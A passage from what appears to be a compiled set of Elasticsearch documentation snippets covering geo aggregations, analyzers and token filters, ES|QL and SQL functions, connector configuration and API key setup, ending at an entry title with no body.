    "properties": {
      "location": {
        "type": "geo_point"
      }
    }
  }
}

POST /museums/_bulk?refresh
{"index":{"_id":1}}
{"location": "POINT (4.912350 52.374081)", "name": "NEMO Science Museum"}
{"index":{"_id":2}}
{"location": "POINT (4.901618 52.369219)", "name": "Museum Het Rembrandthuis"}
{"index":{"_id":3}}
{"location": "POINT (4.914722 52.371667)", "name": "Nederlands Scheepvaartmuseum"}
{"index":{"_id":4}}
{"location": "POINT (4.405200 51.222900)", "name": "Letterenhuis"}
{"index":{"_id":5}}
{"location": "POINT (2.336389 48.861111)", "name": "Musée du Louvre"}
{"index":{"_id":6}}
{"location": "POINT (2.327000 48.860000)", "name": "Musée d'Orsay"}

POST /museums/_search?size=0
{
  "query": {
    "match": { "name": "musée" }
  },
  "aggs": {
    "viewport": {
      "geo_bounds": {
        "field": "location",
        "wrap_longitude": true
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Simple Pattern Split Tokenizer in Elasticsearch
DESCRIPTION: Example showing how to configure a simple_pattern_split tokenizer to split text on underscores. The configuration creates a custom analyzer with the tokenizer and tests it using the _analyze endpoint.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "my_tokenizer"
        }
      },
      "tokenizer": {
        "my_tokenizer": {
          "type": "simple_pattern_split",
          "pattern": "_"
        }
      }
    }
  }
}

POST my-index-000001/_analyze
{
  "analyzer": "my_analyzer",
  "text": "an_underscored_phrase"
}

LANGUAGE: text
CODE:
[ an, underscored, phrase ]

----------------------------------------

TITLE: Converting String to Datetime using TO_DATETIME in ESQL
DESCRIPTION: Demonstrates how to convert string datetime values to datetime format using the TO_DATETIME function. The function accepts strings in the format 'yyyy-MM-dd'T'HH:mm:ss.SSS'Z'' and returns a datetime value. Note that when converting from nanosecond resolution, values are truncated rather than rounded.

LANGUAGE: sql
CODE:
ROW string = ["1953-09-02T00:00:00.000Z", "1964-06-02T00:00:00.000Z", "1964-06-02 00:00:00"]
| EVAL datetime = TO_DATETIME(string)

----------------------------------------

TITLE: EQL CIDR Match Function Example
DESCRIPTION: Returns true if an IP address is contained in one or more provided CIDR blocks.

LANGUAGE: eql
CODE:
cidrMatch(source.address, "192.168.0.0/16")               // returns true
cidrMatch(source.address, "192.168.0.0/16", "10.0.0.0/8") // returns true
cidrMatch(source.address, "10.0.0.0/8")                   // returns false

----------------------------------------

TITLE: Removing Duplicate Tokens in Elasticsearch Analysis
DESCRIPTION: Example showing how to remove duplicate tokens by adding the remove_duplicates filter to the analysis chain.

LANGUAGE: json
CODE:
GET _analyze
{
  "tokenizer": "whitespace",
  "filter": [
    "keyword_repeat",
    "stemmer",
    "remove_duplicates"
  ],
  "text": "jumping dog"
}

----------------------------------------

TITLE: Custom Email Pattern Analyzer Configuration
DESCRIPTION: Shows how to configure a pattern analyzer to split email addresses on non-word characters or underscores.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_email_analyzer": {
          "type":      "pattern",
          "pattern":   "\\W|_",
          "lowercase": true
        }
      }
    }
  }
}

POST my-index-000001/_analyze
{
  "analyzer": "my_email_analyzer",
  "text": "John_Smith@foo-bar.com"
}

LANGUAGE: text
CODE:
[ john, smith, foo, bar, com ]

----------------------------------------

TITLE: Creating Time-Based Sorted Index in Elasticsearch
DESCRIPTION: Example showing how to create an events index sorted by timestamp in descending order for efficient time-based queries.

LANGUAGE: console
CODE:
PUT events
{
  "settings": {
    "index": {
      "sort.field": "timestamp",
      "sort.order": "desc"
    }
  },
  "mappings": {
    "properties": {
      "timestamp": {
        "type": "date"
      }
    }
  }
}

----------------------------------------

TITLE: Advanced Sync Rule: Issue-Based Indexing
DESCRIPTION: Example of an advanced sync rule for the GitHub connector that indexes documents based on an issue query related to bugs.

LANGUAGE: json
CODE:
[
  {
    "repository": "repo_name",
    "filter": {
      "issue": "is:bug"
    }
  }
]

----------------------------------------

TITLE: Executing Cartesian-centroid Aggregation on Shape Field
DESCRIPTION: This snippet demonstrates how to perform a cartesian-centroid aggregation on a shape field for all documents in the index.

LANGUAGE: console
CODE:
POST /places/_search?size=0
{
  "aggs": {
    "centroid": {
      "cartesian_centroid": {
        "field": "geometry"
      }
    }
  }
}

----------------------------------------

TITLE: Synopsis for elasticsearch-setup-passwords Command
DESCRIPTION: Shows the command syntax and available options for the elasticsearch-setup-passwords tool, including auto/interactive modes and various flags for customization.

LANGUAGE: shell
CODE:
bin/elasticsearch-setup-passwords auto|interactive\n[-b, --batch] [-h, --help] [-E <KeyValuePair>]\n[-s, --silent] [-u, --url "<URL>"] [-v, --verbose]

----------------------------------------

TITLE: Using LEAST Function in ESQL
DESCRIPTION: This snippet demonstrates the usage of the LEAST function in ESQL to find the smallest value among multiple arguments. It creates a row with two integer values and applies the LEAST function to determine the smaller of the two.

LANGUAGE: esql
CODE:
ROW a = 10, b = 20
| EVAL l = LEAST(a, b)

----------------------------------------

TITLE: Basic Pattern Capture Example
DESCRIPTION: Demonstrates basic pattern matching with capture groups for alphanumeric text.

LANGUAGE: text
CODE:
"(([a-z]+)(\d*))"

----------------------------------------

TITLE: Querying PI() Function in ESQL
DESCRIPTION: This snippet demonstrates how to use the PI() function in ESQL to return the mathematical constant pi. The function takes no arguments and returns a double-precision floating-point number representing pi.

LANGUAGE: esql
CODE:
ROW PI()

----------------------------------------

TITLE: Grouping Geo-line Aggregation with Time Series
DESCRIPTION: This snippet demonstrates how to perform a geo_line aggregation grouped by time series, on the previously created time series index. This method offers performance advantages over terms grouping.

LANGUAGE: console
CODE:
POST /tour/_search?filter_path=aggregations
{
  "aggregations": {
    "path": {
      "time_series": {},
      "aggregations": {
        "museum_tour": {
          "geo_line": {
            "point": {"field": "location"}
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Append Processor in Elasticsearch Ingest Pipeline
DESCRIPTION: This snippet demonstrates how to configure the Append processor in an Elasticsearch ingest pipeline. It shows appending multiple values, including static strings and dynamic values using template snippets, to a 'tags' field.

LANGUAGE: json
CODE:
{
  "append": {
    "field": "tags",
    "value": ["production", "{{{app}}}", "{{{owner}}}"]
  }
}

----------------------------------------

TITLE: MongoDB Aggregation Pipeline Sync Rule
DESCRIPTION: Structure of a MongoDB aggregation pipeline used as a sync rule for the connector. This shows the basic format for defining an aggregation pipeline with options.

LANGUAGE: json
CODE:
{
	"aggregate":{
		"pipeline": [
			// pipeline elements go here
		],
		"options": {
            // pipeline options go here
		}
    }
}

----------------------------------------

TITLE: Defining Supported Types for ESQL String and Delimiter Combinations in Markdown
DESCRIPTION: This markdown table defines the supported data types for various combinations of string and delimiter inputs in ESQL functions. It shows the result type for different input type combinations.

LANGUAGE: markdown
CODE:
| string | delim | result |
| --- | --- | --- |
| keyword | keyword | keyword |
| keyword | text | keyword |
| text | keyword | keyword |
| text | text | keyword |

----------------------------------------

TITLE: Analyzing Text with Elision Filter in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the Elasticsearch analyze API with the elision filter to remove the elision 'j'' from the beginning of a token.

LANGUAGE: console
CODE:
GET _analyze
{
  "tokenizer" : "standard",
  "filter" : ["elision"],
  "text" : "j'examine près du wharf"
}

----------------------------------------

TITLE: Configuring Microsoft SQL Connector in YAML
DESCRIPTION: Example configuration for a self-managed Microsoft SQL connector in a YAML file.

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: mssql
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>

----------------------------------------

TITLE: Querying Top Salaries using ESQL
DESCRIPTION: This ESQL query retrieves the top 3 salaries in descending order and the maximum salary from an 'employees' table. It uses the TOP function to get the top 3 salaries and the MAX function to get the highest salary.

LANGUAGE: esql
CODE:
FROM employees
| STATS top_salaries = TOP(salary, 3, "desc"), top_salary = MAX(salary)

----------------------------------------

TITLE: Basic LIKE Operator Syntax in Elasticsearch SQL
DESCRIPTION: Basic syntax structure for the LIKE operator in Elasticsearch SQL. Used for pattern matching with wildcards % (multiple characters) and _ (single character).

LANGUAGE: sql
CODE:
expression        
LIKE constant_exp

----------------------------------------

TITLE: Describing Count Function in ESQL
DESCRIPTION: This snippet provides a description of the Count function in ESQL. It explains that the function converts a multivalued expression into a single valued column containing a count of the number of values.

LANGUAGE: markdown
CODE:
**Description**

Converts a multivalued expression into a single valued column containing a count of the number of values.

----------------------------------------

TITLE: Implementing Security Checks for Elevated Privileges in Java
DESCRIPTION: This code snippet demonstrates how to implement proper security checks before performing operations that require elevated privileges in an Elasticsearch plugin. It uses the SecurityManager to check for SpecialPermission before executing privileged code.

LANGUAGE: java
CODE:
// ES permission you should check before doPrivileged() blocks
import org.elasticsearch.SpecialPermission;

SecurityManager sm = System.getSecurityManager();
if (sm != null) {
  // unprivileged code such as scripts do not have SpecialPermission
  sm.checkPermission(new SpecialPermission());
}
AccessController.doPrivileged(
  // sensitive operation
);

----------------------------------------

TITLE: Explicit Mapping for Hierarchical JSON Document in Elasticsearch
DESCRIPTION: Demonstrates how to create an explicit mapping for a hierarchical JSON document using nested object fields in Elasticsearch.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": { <1>
      "region": {
        "type": "keyword"
      },
      "manager": { <2>
        "properties": {
          "age":  { "type": "integer" },
          "name": { <3>
            "properties": {
              "first": { "type": "text" },
              "last":  { "type": "text" }
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Running Redis Connector Docker Image
DESCRIPTION: Docker command to run the Connector Service with the Redis connector configuration.

LANGUAGE: shell
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Creating Microsoft SQL Connector via Elasticsearch API
DESCRIPTION: Example of using the Elasticsearch API to create a new self-managed Microsoft SQL connector.

LANGUAGE: json
CODE:
PUT _connector/my-mssql-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from Microsoft SQL",
  "service_type": "mssql"
}

----------------------------------------

TITLE: Querying Airport Boundaries with Spatial Functions in ESQL
DESCRIPTION: This ESQL query filters for Copenhagen airport, calculates the envelope of its city boundary, and extracts the minimum and maximum coordinates. It demonstrates the use of ST_ENVELOPE, ST_XMIN, ST_XMAX, ST_YMIN, and ST_YMAX functions.

LANGUAGE: esql
CODE:
FROM airport_city_boundaries
| WHERE abbrev == "CPH"
| EVAL envelope = ST_ENVELOPE(city_boundary)
| EVAL xmin = ST_XMIN(envelope), xmax = ST_XMAX(envelope), ymin = ST_YMIN(envelope), ymax = ST_YMAX(envelope)
| KEEP abbrev, airport, xmin, xmax, ymin, ymax

----------------------------------------

TITLE: Configuring Synonym Filter with Synonyms Set in Elasticsearch
DESCRIPTION: JSON configuration for a synonym filter using a predefined synonyms set in Elasticsearch.

LANGUAGE: json
CODE:
{
  "filter": {
    "synonyms_filter": {
      "type": "synonym",
      "synonyms_set": "my-synonym-set",
      "updateable": true
    }
  }
}

----------------------------------------

TITLE: MIT License Declaration
DESCRIPTION: Standard MIT open source software license text dated 2004-2015 for Paul R. Holser, Jr.'s work. Grants permissions for software use, modification and distribution while disclaiming warranties and liability.

LANGUAGE: text
CODE:
/*
 The MIT License

 Copyright (c) 2004-2015 Paul R. Holser, Jr.

 Permission is hereby granted, free of charge, to any person obtaining
 a copy of this software and associated documentation files (the
 "Software"), to deal in the Software without restriction, including
 without limitation the rights to use, copy, modify, merge, publish,
 distribute, sublicense, and/or sell copies of the Software, and to
 permit persons to whom the Software is furnished to do so, subject to
 the following conditions:

 The above copyright notice and this permission notice shall be
 included in all copies or substantial portions of the Software.

 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
 EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
 NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
 LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
 OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
 WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

----------------------------------------

TITLE: Year-based Date Differences with DATE_DIFF in ESQL
DESCRIPTION: Shows how DATE_DIFF handles year calculations between dates at year boundaries. Demonstrates that only fully elapsed years are counted, explaining why dates within the same year return 0.

LANGUAGE: esql
CODE:
ROW end_23=TO_DATETIME("2023-12-31T23:59:59.999Z"),
  start_24=TO_DATETIME("2024-01-01T00:00:00.000Z"),
    end_24=TO_DATETIME("2024-12-31T23:59:59.999")
| EVAL end23_to_start24=DATE_DIFF("year", end_23, start_24)
| EVAL end23_to_end24=DATE_DIFF("year", end_23, end_24)
| EVAL start_to_end_24=DATE_DIFF("year", start_24, end_24)

----------------------------------------

TITLE: Converting Single Integer to String in ESQL
DESCRIPTION: This snippet demonstrates how to use the TO_STRING function to convert a single integer value to its string representation in ESQL. It uses the EVAL command to create a new column with the converted value.

LANGUAGE: esql
CODE:
ROW a=10
| EVAL j = TO_STRING(a)

----------------------------------------

TITLE: Indexing Child Answer Documents
DESCRIPTION: Indexes two answer documents as children of the question document, including routing for proper parent-child relationship.

LANGUAGE: console
CODE:
PUT child_example/_doc/2?routing=1
{
  "join": {
    "name": "answer",
    "parent": "1"
  },
  "owner": {
    "location": "Norfolk, United Kingdom",
    "display_name": "Sam",
    "id": 48
  },
  "body": "<p>Unfortunately you're pretty much limited to FTP...",
  "creation_date": "2009-05-04T13:45:37.030"
}

PUT child_example/_doc/3?routing=1&refresh
{
  "join": {
    "name": "answer",
    "parent": "1"
  },
  "owner": {
    "location": "Norfolk, United Kingdom",
    "display_name": "Troll",
    "id": 49
  },
  "body": "<p>Use Linux...",
  "creation_date": "2009-05-05T13:45:37.030"
}

----------------------------------------

TITLE: Using Parent-Join Queries and Aggregations in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use parent-join queries, aggregations, and access join field values in scripts.

LANGUAGE: console
CODE:
GET my-index-000001/_search
{
  "query": {
    "parent_id": {
      "type": "answer",
      "id": "1"
    }
  },
  "aggs": {
    "parents": {
      "terms": {
        "field": "my_join_field#question",
        "size": 10
      }
    }
  },
  "runtime_mappings": {
    "parent": {
      "type": "long",
      "script": """
        emit(Integer.parseInt(doc['my_join_field#question'].value))
      """
    }
  },
  "fields": [
    { "field": "parent" }
  ]
}

----------------------------------------

TITLE: Defining JSON Operations for Elasticsearch Update By Query Scripts
DESCRIPTION: Specifies allowed JSON operations for loading and dumping data in update_by_query scripts.

LANGUAGE: Java
CODE:
class org.elasticsearch.painless.api.Json {
  def load(String)
  String dump(def)
  String dump(def, boolean)
}

----------------------------------------

TITLE: Analyzing Text with Truncate Filter in Elasticsearch
DESCRIPTION: Example of using the analyze API with the truncate filter to shorten tokens exceeding 10 characters in length. Uses whitespace tokenizer and applies the default truncate filter settings.

LANGUAGE: console
CODE:
GET _analyze
{
  "tokenizer" : "whitespace",
  "filter" : ["truncate"],
  "text" : "the quinquennial extravaganza carried on"
}

----------------------------------------

TITLE: Displaying Supported Types Table in Markdown
DESCRIPTION: This snippet shows a markdown table that lists the supported string types and their corresponding result types in ESQL's AbstractFunctionTestCase.

LANGUAGE: markdown
CODE:
| string | result |
| --- | --- |
| keyword | keyword |
| text | keyword |

----------------------------------------

TITLE: Using CURRENT_TIME Function
DESCRIPTION: Examples of using CURRENT_TIME function to get the current time, with optional precision parameter.

LANGUAGE: sql
CODE:
SELECT CURRENT_TIME AS result;

LANGUAGE: sql
CODE:
SELECT CURRENT_TIME() AS result;

LANGUAGE: sql
CODE:
SELECT CURTIME() AS result;

LANGUAGE: sql
CODE:
SELECT CURRENT_TIME(1) AS result;

LANGUAGE: sql
CODE:
SELECT first_name FROM emp WHERE CAST(hire_date AS TIME) > CURRENT_TIME() - INTERVAL 20 MINUTES ORDER BY first_name ASC LIMIT 5;

----------------------------------------

TITLE: Basic Bucket Correlation Syntax in Elasticsearch
DESCRIPTION: Shows the basic structure of a bucket correlation aggregation with buckets_path pointing to count values and a correlation function definition.

LANGUAGE: json
CODE:
{
  "bucket_correlation": {
    "buckets_path": "range_values>_count",
    "function": {
      "count_correlation": {
        "indicator": {
          "expectations": [...],
          "doc_count": 10000
        }
      }
    }
  }
}

----------------------------------------

TITLE: Basic Bucket Correlation Syntax in Elasticsearch
DESCRIPTION: Shows the basic structure of a bucket correlation aggregation with buckets_path pointing to count values and a correlation function definition.

LANGUAGE: json
CODE:
{
  "bucket_correlation": {
    "buckets_path": "range_values>_count",
    "function": {
      "count_correlation": {
        "indicator": {
          "expectations": [...],
          "doc_count": 10000
        }
      }
    }
  }
}

----------------------------------------

TITLE: Docker Configuration for Box Connector
DESCRIPTION: YAML configuration for deploying the Box connector using Docker

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: box
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>

----------------------------------------

TITLE: Finding Documents with Missing Values in Elasticsearch
DESCRIPTION: Shows how to use must_not boolean query with exists query to find documents missing indexed values for a specific field. This example searches for documents where the 'user.id' field does not exist.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "bool": {
      "must_not": {
        "exists": {
          "field": "user.id"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Using LEAST Function in Elasticsearch SQL
DESCRIPTION: Demonstrates how to use the LEAST function to find the minimum value between two columns 'a' and 'b'. The function compares values across multiple columns and returns the smallest value among them.

LANGUAGE: sql
CODE:
ROW a = 10, b = 20
| EVAL l = LEAST(a, b)

----------------------------------------

TITLE: Querying Disjoint Geometries with ST_DISJOINT in Elasticsearch SQL
DESCRIPTION: This query demonstrates the use of the ST_DISJOINT function in ESQL to filter airport city boundaries that do not intersect with a specified polygon. It returns the abbrev, airport, region, city, and city_location fields for matching records.

LANGUAGE: sql
CODE:
FROM airport_city_boundaries
| WHERE ST_DISJOINT(city_boundary, TO_GEOSHAPE("POLYGON((-10 -60, 120 -60, 120 60, -10 60, -10 -60))"))
| KEEP abbrev, airport, region, city, city_location

----------------------------------------

TITLE: Monthly to Annual Rate Conversion
DESCRIPTION: Example showing how to group sales records into monthly buckets and convert to annual rates.

LANGUAGE: console
CODE:
GET sales/_search
{
  "size": 0,
  "aggs": {
    "by_date": {
      "date_histogram": {
        "field": "date",
        "calendar_interval": "month"
      },
      "aggs": {
        "my_rate": {
          "rate": {
            "unit": "year"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Analyzing Text with CJK Width Token Filter in Elasticsearch
DESCRIPTION: This example demonstrates how to use the _analyze API with the CJK width token filter to normalize full-width characters in Japanese text.

LANGUAGE: json
CODE:
GET /_analyze
{
  "tokenizer" : "standard",
  "filter" : ["cjk_width"],
  "text" : "ｼｰｻｲﾄﾞﾗｲﾅｰ"
}

----------------------------------------

TITLE: Configuring Custom Standard Analyzer in Elasticsearch
DESCRIPTION: Example of creating a custom standard analyzer with modified max_token_length and English stopwords configuration.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_english_analyzer": {
          "type": "standard",
          "max_token_length": 5,
          "stopwords": "_english_"
        }
      }
    }
  }
}

POST my-index-000001/_analyze
{
  "analyzer": "my_english_analyzer",
  "text": "The 2 QUICK Brown-Foxes jumped over the lazy dog's bone."
}

----------------------------------------

TITLE: Basic Max Bucket Aggregation Syntax in Elasticsearch
DESCRIPTION: Shows the basic syntax structure for a max_bucket aggregation that finds the maximum value using a specified buckets_path.

LANGUAGE: json
CODE:
{
  "max_bucket": {
    "buckets_path": "the_sum"
  }
}

----------------------------------------

TITLE: Configuring Custom Analyzer with Synonym Filter in Elasticsearch
DESCRIPTION: JSON configuration for a custom analyzer that includes a synonym token filter in Elasticsearch.

LANGUAGE: json
CODE:
{
      "analyzer": {
        "my_analyzer": {
          "type": "custom",
          "tokenizer": "standard",
          "filter": ["stemmer", "synonym"]
        }
      }
}

----------------------------------------

TITLE: Parsing Date String Using DATE_PARSE Function in Elasticsearch ESQL
DESCRIPTION: This snippet demonstrates how to use the DATE_PARSE function in Elasticsearch ESQL. It takes a date string and a format string as arguments, and returns a parsed date object.

LANGUAGE: sql
CODE:
ROW date_string = "2022-05-06"
| EVAL date = DATE_PARSE("yyyy-MM-dd", date_string)

----------------------------------------

TITLE: Finding First Value in Elasticsearch SQL
DESCRIPTION: Returns the first non-null value of a field, optionally sorted by another field.

LANGUAGE: sql
CODE:
SELECT FIRST(first_name) FROM emp;

LANGUAGE: sql
CODE:
SELECT gender, FIRST(first_name) FROM emp GROUP BY gender ORDER BY gender;

LANGUAGE: sql
CODE:
SELECT FIRST(first_name, birth_date) FROM emp;

----------------------------------------

TITLE: Installing Elasticsearch Plugins Command Usage
DESCRIPTION: Command to display the help menu for the elasticsearch-plugin tool, which is used for installing, listing, and removing plugins in self-managed Elasticsearch deployments.

LANGUAGE: bash
CODE:
sudo bin/elasticsearch-plugin -h

----------------------------------------

TITLE: Creating Custom Analyzer with ASCII Folding
DESCRIPTION: Example of creating a custom analyzer using the asciifolding filter through the create index API.

LANGUAGE: console
CODE:
PUT /asciifold_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "standard_asciifolding": {
          "tokenizer": "standard",
          "filter": [ "asciifolding" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Documenting ESQL Function Parameter in Markdown
DESCRIPTION: This snippet defines the parameter 'point' for an ESQL function. It specifies the expected data types and behavior for null input.

LANGUAGE: markdown
CODE:
**Parameters**

`point`
:   Expression of type `geo_point`, `geo_shape`, `cartesian_point` or `cartesian_shape`. If `null`, the function returns `null`.

----------------------------------------

TITLE: Mapping String Types to Result Types in ESQL
DESCRIPTION: This markdown table shows the mapping of string input types to their corresponding result types in ESQL. It includes 'keyword' and 'text' as input types, both resulting in 'keyword' output.

LANGUAGE: markdown
CODE:
| string | result |
| --- | --- |
| keyword | keyword |
| text | keyword |

----------------------------------------

TITLE: Creating Custom Analyzer with Lowercase Filter in Elasticsearch
DESCRIPTION: This example shows how to use the create index API to configure a new custom analyzer that includes the lowercase filter.

LANGUAGE: console
CODE:
PUT lowercase_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "whitespace_lowercase": {
          "tokenizer": "whitespace",
          "filter": [ "lowercase" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Searching Sorted Index with Early Termination in Elasticsearch
DESCRIPTION: Examples of search queries that leverage index sorting for early termination, including basic sorting and optimized searching with disabled total hits tracking.

LANGUAGE: console
CODE:
GET /events/_search
{
  "size": 10,
  "sort": [
    { "timestamp": "desc" }
  ]
}

LANGUAGE: console
CODE:
GET /events/_search
{
  "size": 10,
  "sort": [
      { "timestamp": "desc" }
  ],
  "track_total_hits": false
}

----------------------------------------

TITLE: Concatenating Non-String Array with MV_CONCAT and TO_STRING in ESQL
DESCRIPTION: This example shows how to concatenate elements of a non-string array using MV_CONCAT function. It first converts the array elements to strings using the TO_STRING function.

LANGUAGE: esql
CODE:
ROW a=[10, 9, 8]
| EVAL j = MV_CONCAT(TO_STRING(a), ", ")

----------------------------------------

TITLE: Handling Missing Values in Weighted Average Aggregation
DESCRIPTION: Shows how to handle missing values in weighted average calculations by specifying default values for both the value and weight fields when they are missing or null.

LANGUAGE: console
CODE:
POST /exams/_search
{
  "size": 0,
  "aggs": {
    "weighted_grade": {
      "weighted_avg": {
        "value": {
          "field": "grade",
          "missing": 2
        },
        "weight": {
          "field": "weight",
          "missing": 3
        }
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Google Drive Connector in YAML
DESCRIPTION: Example YAML configuration for setting up the Google Drive connector with Elasticsearch and Kibana.

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: google_drive
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead

----------------------------------------

TITLE: Generating MD5 Hashes with ESQL
DESCRIPTION: Query that filters out connection error messages, generates MD5 hashes of the remaining messages, and returns only the message and hash columns. The example demonstrates data filtering, hash generation, and column selection.

LANGUAGE: esql
CODE:
FROM sample_data
| WHERE message != "Connection error"
| EVAL md5 = md5(message)
| KEEP message, md5

----------------------------------------

TITLE: Creating an API Key for MySQL Connector
DESCRIPTION: This snippet shows how to create an API key for the MySQL connector with the necessary permissions using the Elasticsearch API.

LANGUAGE: JSON
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: ESQL SUBSTRING without Length Parameter
DESCRIPTION: Illustrates using SUBSTRING function without the length parameter to return all characters after a specified position, extracting everything except the first character.

LANGUAGE: esql
CODE:
FROM employees
| KEEP last_name
| EVAL ln_sub = SUBSTRING(last_name, 2)

----------------------------------------

TITLE: Basic Pattern Analyzer Example in Elasticsearch
DESCRIPTION: Demonstrates basic usage of the pattern analyzer to tokenize a sentence using default settings.

LANGUAGE: console
CODE:
POST _analyze
{
  "analyzer": "pattern",
  "text": "The 2 QUICK Brown-Foxes jumped over the lazy dog's bone."
}

LANGUAGE: text
CODE:
[ the, 2, quick, brown, foxes, jumped, over, the, lazy, dog, s, bone ]

----------------------------------------

TITLE: Partition-based Routing Formula
DESCRIPTION: Formula for calculating shard routing when using index partitioning with routing_partition_size.

LANGUAGE: text
CODE:
routing_value = hash(_routing) + hash(_id) % routing_partition_size
shard_num = (routing_value % num_routing_shards) / routing_factor

----------------------------------------

TITLE: Customizing ASCII Folding Filter
DESCRIPTION: Example of creating a custom ASCII folding filter with preserve_original parameter enabled to emit both original and folded tokens.

LANGUAGE: console
CODE:
PUT /asciifold_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "standard_asciifolding": {
          "tokenizer": "standard",
          "filter": [ "my_ascii_folding" ]
        }
      },
      "filter": {
        "my_ascii_folding": {
          "type": "asciifolding",
          "preserve_original": true
        }
      }
    }
  }
}

----------------------------------------

TITLE: Creating a Custom Analyzer with Mapping Character Filter in Elasticsearch
DESCRIPTION: This example demonstrates how to create a custom analyzer that includes a customized 'mapping' character filter. The filter is configured to replace emoticons with their text equivalents.

LANGUAGE: json
CODE:
PUT /my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "standard",
          "char_filter": [
            "my_mappings_char_filter"
          ]
        }
      },
      "char_filter": {
        "my_mappings_char_filter": {
          "type": "mapping",
          "mappings": [
            ":) => _happy_",
            ":( => _sad_"
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Analyzing Text with CJK Bigram Filter
DESCRIPTION: Example of using the analyze API to demonstrate CJK bigram token filter processing of Japanese text.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer" : "standard",
  "filter" : ["cjk_bigram"],
  "text" : "東京都は、日本の首都であり"
}

LANGUAGE: text
CODE:
[ 東京, 京都, 都は, 日本, 本の, の首, 首都, 都で, であ, あり ]

----------------------------------------

TITLE: Adding JitPack Repository for Third-Party Dependencies
DESCRIPTION: Demonstrates how to add the JitPack repository to resolve unreleased snapshots from a GitHub repository, useful for testing development versions of third-party dependencies.

LANGUAGE: gradle
CODE:
allprojects {
  repositories {
    maven { url "https://jitpack.io" }
  }
}

----------------------------------------

TITLE: Allocation Filter for Migration
DESCRIPTION: Example of using cluster settings API to exclude a node during migration from multiple data paths

LANGUAGE: json
CODE:
PUT _cluster/settings
{
  "persistent": {
    "cluster.routing.allocation.exclude._name": "target-node-name"
  }
}

----------------------------------------

TITLE: Creating Query Ruleset in Elasticsearch
DESCRIPTION: Example showing how to create a query ruleset with two rules - one for pinning specific documents and another for excluding documents based on metadata criteria.

LANGUAGE: console
CODE:
PUT /_query_rules/my-ruleset
{
  "rules": [
    {
      "rule_id": "rule1",
      "type": "pinned",
      "criteria": [
        {
          "type": "fuzzy",
          "metadata": "query_string",
          "values": [ "puggles", "pugs" ]
        },
        {
          "type": "exact",
          "metadata": "user_country",
          "values": [ "us" ]
        }
      ],
      "actions": {
        "ids": [
          "id1",
          "id2"
        ]
      }
    },
    {
      "rule_id": "rule2",
      "type": "exclude",
      "criteria": [
        {
          "type": "contains",
          "metadata": "query_string",
          "values": [ "beagles" ]
        }
      ],
      "actions": {
        "docs": [
          {
            "_index": "my-index-000001",
            "_id": "id3"
          },
          {
            "_index": "my-index-000002",
            "_id": "id4"
          }
        ]
      }
    }
  ]
}

----------------------------------------

TITLE: Parsing Date and Extracting Year in ESQL
DESCRIPTION: This snippet shows how to parse a date string into a date object and then extract the year from it using ESQL functions. It uses DATE_PARSE to convert a string to a date and DATE_EXTRACT to get the year component.

LANGUAGE: esql
CODE:
ROW date = DATE_PARSE("yyyy-MM-dd", "2022-05-06")
| EVAL year = DATE_EXTRACT("year", date)

----------------------------------------

TITLE: Customizing Stop Filter with Specific Stop Words
